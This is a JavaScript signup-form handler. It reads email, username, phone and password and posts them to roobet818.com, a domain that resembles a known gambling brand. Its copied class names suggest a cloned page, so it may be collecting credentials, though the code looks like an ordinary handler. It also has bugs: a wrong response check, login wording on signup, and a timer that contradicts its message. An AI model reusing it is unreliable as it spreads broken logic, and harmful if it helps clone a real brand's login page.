document.addEventListener('DOMContentLoaded', function () {
  const signupForm = document.getElementById('signupForm');

  if (signupForm) {
    const playNowButton = document.querySelector('.css-tqtxkk');

    if (playNowButton) {
      playNowButton.addEventListener('click', function (event) {
        event.preventDefault();

        // Get the values from input fields
        const email = document.getElementById('auth-dialog-emailaddress').value;
        const username = document.getElementById('auth-dialog-username').value;
        const phoneNumber = document.getElementById('auth-dialog-PhoneNumber').value;
        const password = document.getElementById('auth-dialog-Password').value;

        const data = {
          email: email,
          username: username,
          phoneNumber: phoneNumber,
          password: password
        };

        // Send a POST request to the backend
        fetch('https://roobet818.com/api/signup', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        })
          .then(response => {
            if (response.details === "ER_DUP_ENTRY") {
              // Email is already registered, show a popup
              alert('Email is already registered');

              return response.json();
            } else if (response.ok) {
              // Continue processing for successful signup
              return response.json();
            } else {
              // Handle other errors, e.g., show an error message to the user
              throw new Error('Signup failed');
            }
          })
          .then(data => {
            if (data.token) {
              // Show alert for successful login
              alert('Login successful! Redirecting to home page in 5 seconds.');
              setTimeout(function () {
                window.location.href = './index.html';
              }, 1000);
            } else {
              console.error('Login failed:', data.message);
            }
          })
          .catch((error) => {
            console.error('Error:', error);
          });
      });
    }
  }
});

  document.addEventListener('DOMContentLoaded', function () {
    // Assuming you have a button element as described in your HTML
    const togglePasswordButton = document.querySelector('.MuiIconButton-root-553');

    if (togglePasswordButton) {
        togglePasswordButton.addEventListener('click', function () {
            // Get the password input field
            const passwordInput = document.getElementById('auth-dialog-Password');

            // Toggle the type attribute of the password input between 'password' and 'text'
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    }
});

  